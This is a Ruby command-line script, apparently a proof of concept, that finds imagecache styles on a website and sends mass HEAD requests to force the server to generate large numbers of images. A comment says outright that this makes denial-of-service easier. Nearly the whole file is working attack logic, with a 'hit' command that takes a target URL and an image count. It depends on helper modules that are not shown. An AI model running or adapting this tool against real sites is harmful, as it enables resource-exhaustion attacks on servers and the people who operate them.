require "rubygems"
require "mechanize"
require "hpricot"
require "ruby-progressbar"
require "thor"
require "./style"
require "./detect"

STYLE_RE = /^(.*\/styles\/)([^\/]*)\/((.*)\/([^\/]*)(\/\w+\.\w+))$/

class CanHaz < Thor
  desc "haz URL", "find out if site at URL has imagecache"
  def haz(url)
    detector = Detect.new(url)
    puts (detector.haz? ? "yups, haz" : "nope, nawt haz")
  end

  desc "styles URL", "find a list of potential imagecache styles on URL"
  def styles(url)
    detector = Detect.new(url)
    detector.styles.each do |style|
      puts style
    end
  end

  option :styles, :type => :array, :desc => "override styles instead of detecting them."
  desc "hit URL AMOUNT", "hit site at URL, make it generate a total of AMOUNT images"
  def hit(url, amount)
    detector = Detect.new(url)
    potentials = detector.potentials(amount, options[:styles])

    amount_paths = detector.paths.count
    if options[:styles]
      amount_styles = options[:styles].count
    else
      amount_styles = detector.styles.count
    end
    puts "Potential images:   #{detector.paths.count}"
    puts "Potential styles:   #{amount_styles}"

    puts "Amount to generate: #{potentials.count}"

    pbar = ProgressBar.create(:title => "generating imgs", :total => potentials.count)
    potentials.each do |potential|
      # POC show that with apache fetching HEAD is enough to create the imagecached file. Makes it easier to DDOS.
      detector.agent.head(potential)
      pbar.increment
    end
  end
end

CanHaz.start(ARGV)
